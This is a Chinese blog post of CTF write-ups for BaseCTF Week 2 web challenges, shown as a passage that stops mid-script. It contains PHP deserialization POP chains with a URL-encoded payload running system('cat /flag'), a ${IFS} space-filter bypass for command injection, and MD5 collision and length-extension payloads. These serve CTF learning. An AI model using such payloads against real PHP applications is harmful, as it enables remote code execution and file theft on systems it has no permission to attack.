<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>'BaseCTF-web-wp' | Dyinglight's blog</title><meta name="author" content="Dyinglight"><meta name="copyright" content="Dyinglight"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BaseCTF-web[Week2] ez_ser源代码+poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phphighlight_file(__FILE__);error_reporting(0">
<meta property="og:type" content="article">
<meta property="og:title" content="&#39;BaseCTF-web-wp&#39;">
<meta property="og:url" content="https://www.dyinglight.me/posts/BaseCTF-web-wp/index.html">
<meta property="og:site_name" content="Dyinglight&#39;s blog">
<meta property="og:description" content="BaseCTF-web[Week2] ez_ser源代码+poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phphighlight_file(__FILE__);error_reporting(0">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.dyinglight.me/img/sly.jpg">
<meta property="article:published_time" content="2024-08-26T08:28:12.000Z">
<meta property="article:modified_time" content="2024-09-06T09:41:13.408Z">
<meta property="article:author" content="Dyinglight">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.dyinglight.me/img/sly.jpg"><link rel="shortcut icon" href="/img/%E6%98%9F%E7%90%83.png"><link rel="canonical" href="https://www.dyinglight.me/posts/BaseCTF-web-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '\'BaseCTF-web-wp\'',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-06 17:41:13'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/sly.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dyinglight's blog"><span class="site-name">Dyinglight's blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">'BaseCTF-web-wp'</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-26T08:28:12.000Z" title="发表于 2024-08-26 16:28:12">2024-08-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-06T09:41:13.408Z" title="更新于 2024-09-06 17:41:13">2024-09-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="'BaseCTF-web-wp'"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="BaseCTF-web"><a href="#BaseCTF-web" class="headerlink" title="BaseCTF-web"></a>BaseCTF-web</h1><h2 id="Week2-ez-ser"><a href="#Week2-ez-ser" class="headerlink" title="[Week2] ez_ser"></a>[Week2] ez_ser</h2><p>源代码+poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;<span class="comment">#3 chu0=new pwn()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;<span class="comment">#5</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;<span class="comment">#4 kw=new re()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();<span class="comment">#2 over=new Misc()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<span class="comment">#1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw=<span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0=<span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0-&gt;over=<span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw-&gt;chu0-&gt;dusk=<span class="string">&quot;gods&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week2-一起吃豆豆"><a href="#Week2-一起吃豆豆" class="headerlink" title="[Week2] 一起吃豆豆"></a>[Week2] 一起吃豆豆</h2><p>f12查看源代码，找到一串base64字符串</p>
<p>context.fillText(_LIFE ? atob(“QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ&#x3D;&#x3D;”) : ‘GAME OVER’, this.x, this.y);</p>
<p>解码得到</p>
<p>BaseCTF{J5_gam3_1s_easy_t0_h4ck!!}</p>
<h2 id="Week2-你听不到我的声音"><a href="#Week2-你听不到我的声音" class="headerlink" title="[Week2] 你听不到我的声音"></a>[Week2] 你听不到我的声音</h2><p>shell_exec函数没有回显，使用</p>
<p><img src="/../images/basectf/1.png"></p>
<p><img src="/../images/basectf/2.png"></p>
<p>记得改大小写加花括号BaseCTF{…}</p>
<p>反弹shell没成功，不知道什么原因</p>
<h2 id="Week2-RCEisamazingwithspace"><a href="#Week2-RCEisamazingwithspace" class="headerlink" title="[Week2] RCEisamazingwithspace"></a>[Week2] RCEisamazingwithspace</h2><p>只过滤了空格，用${IFS}代替即可</p>
<p>cat${IFS}&#x2F;flag</p>
<h2 id="Week2-Really-EZ-POP"><a href="#Week2-Really-EZ-POP" class="headerlink" title="[Week2] Really EZ POP"></a>[Week2] Really EZ POP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;<span class="comment">#private</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);<span class="comment">#1 $cmd为执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$word</span> ;<span class="comment">#!!!private</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;<span class="comment">#2 $word=new Sink()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();<span class="comment">#3 $animal=new Shark()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;<span class="comment">#4 $sea=new Sea()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$nature</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nature&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;sea=<span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;sea-&gt;animal=<span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;sea-&gt;animal-&gt;word=<span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>注意第二个private类型必须更改s:11:”%00Shark%00word”;</p>
<p>payload:<code>nature=O%3a6%3a&quot;Nature&quot;%3a1%3a&#123;s%3a3%3a&quot;sea&quot;%3bO%3a3%3a&quot;Sea&quot;%3a1%3a&#123;s%3a6%3a&quot;animal&quot;%3bO%3a5%3a&quot;Shark&quot;%3a1%3a&#123;s%3a11%3a&quot;%00Shark%00word&quot;%3bO%3a4%3a&quot;Sink&quot;%3a1%3a&#123;s%3a9%3a&quot;%00Sink%00cmd&quot;%3bs%3a20%3a&quot;system(&quot;cat%20/flag&quot;)%3b&quot;%3b&#125;&#125;&#125;&#125;</code></p>
<p><img src="/../images/basectf/3.png"></p>
<h2 id="Week2-数学大师"><a href="#Week2-数学大师" class="headerlink" title="[Week2] 数学大师"></a>[Week2] 数学大师</h2><p>先贴脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="string">&#x27;rpskb0cmsdml473qgbumlau9gr&#x27;</span>)  <span class="comment"># 替换为实际的 cookie 名称和值</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 1. 使用 requests 获取网页内容</span></span><br><span class="line">    url = <span class="string">&#x27;http://challenge.basectf.fun:22057/&#x27;</span>  <span class="comment"># 替换为目标网页的 URL</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        response = session.get(url)</span><br><span class="line">        html = response.text</span><br><span class="line">        <span class="built_in">print</span>(html)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\d+[\+\-×÷]\d+)&#x27;</span>, html)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        expression = <span class="keyword">match</span>.group(<span class="number">1</span>)  <span class="comment"># 提取匹配的表达式</span></span><br><span class="line">        <span class="comment"># 替换运算符为 Python 可识别的运算符</span></span><br><span class="line">        expression = expression.replace(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>).replace(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;//&#x27;</span>)</span><br><span class="line">        result = <span class="built_in">eval</span>(expression)  <span class="comment"># 计算表达式</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取的表达式: <span class="subst">&#123;<span class="keyword">match</span>.group(<span class="number">1</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;计算结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            post_url = <span class="string">&#x27;http://challenge.basectf.fun:22057/&#x27;</span>  <span class="comment"># 替换为目标 POST URL</span></span><br><span class="line">            post_data = &#123;<span class="string">&#x27;answer&#x27;</span>: result&#125;</span><br><span class="line">            post_response = session.post(post_url, data=post_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 输出响应</span></span><br><span class="line">            <span class="built_in">print</span>(post_response.text)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\d+[\+\-×÷]\d+)&#x27;</span>, post_response.text)</span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">0.01</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到表达式。&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>注意几个点：使用session来记录会话，可以在浏览器控制台的应用找到</p>
<p>使用flag标签防止第二次循环多请求一次导致清零</p>
<h2 id="Week2-所以你说你懂-MD5"><a href="#Week2-所以你说你懂-MD5" class="headerlink" title="[Week2] 所以你说你懂 MD5?"></a>[Week2] 所以你说你懂 MD5?</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple[]=1&amp;banana[]=2&amp;appple=QNKCDZO&amp;bananana=240610708&amp;apppple=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;banananana=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;md5=156f8018c7da3674f6912c9e5ae2aaa5&amp;name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure>

<p><img src="/../images/basectf/4.png"></p>
<p>脚本md5.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> my_md5</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> six</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">MD5_Hash = <span class="string">&#x27;739ba4f9b7df3a240bf5ea17c27f1827&#x27;</span></span><br><span class="line">length = <span class="number">96</span>  <span class="comment"># 将长度设置为96</span></span><br><span class="line">text = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span> + MD5_Hash[:<span class="number">8</span>].decode(<span class="string">&#x27;hex&#x27;</span>)[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">s2 = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span> + MD5_Hash[<span class="number">8</span>:<span class="number">16</span>].decode(<span class="string">&#x27;hex&#x27;</span>)[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">s3 = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span> + MD5_Hash[<span class="number">16</span>:<span class="number">24</span>].decode(<span class="string">&#x27;hex&#x27;</span>)[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">s4 = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span> + MD5_Hash[<span class="number">24</span>:<span class="number">32</span>].decode(<span class="string">&#x27;hex&#x27;</span>)[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;a&quot;</span> * length</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算填充</span></span><br><span class="line">padding_length = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建填充数据</span></span><br><span class="line">test = secret + <span class="string">&#x27;\x80&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> * padding_length + <span class="string">&#x27;\x00\x03\x00\x00\x00\x00\x00\x00&#x27;</span> + text</span><br><span class="line"></span><br><span class="line">s = 